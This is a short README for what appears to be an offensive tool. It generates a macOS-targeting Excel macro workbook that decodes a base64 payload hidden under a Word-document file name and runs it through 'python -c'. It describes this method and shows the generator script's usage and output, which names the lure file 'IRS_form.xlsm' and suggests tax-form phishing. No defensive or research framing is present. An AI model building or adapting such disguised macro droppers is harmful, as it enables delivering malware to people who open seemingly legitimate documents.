# MacOS_VBA_Macro
Example VBA Macro for MacOS Mojave 10.14

# Summary
The template excel document contains a macro targeting MacOS.
The macro expects a base64 encoded payload to exist at xl/embeddings/Microsoft_Word_Document2.docx.
It will then base64 decode and run the script as a one-liner in a python command (python -c "command").
Note: MacOS 10.14 Mojave does not allow any child processes from Microsoft Excel to establish a socket. Normal get/post request are fine.

# Generate from the python script
```
malware $python generate-malware.py -h
Usage: generate-malware.py [options]

Options:
  -h, --help            show this help message and exit
  -p PAYLOAD_FILENAME, --payload=PAYLOAD_FILENAME
  -t TEMPLATE_FILENAME, --template=TEMPLATE_FILENAME
  -o OUTPUT_FILENAME, --output=OUTPUT_FILENAME
malware $python generate-malware.py -p ../python_payload.bin 
template-doc/Workbook1.xlsm
temp.0.352844482538/payload.tmp
Successful
Saved as temp.0.352844482538/IRS_form.xlsm
```
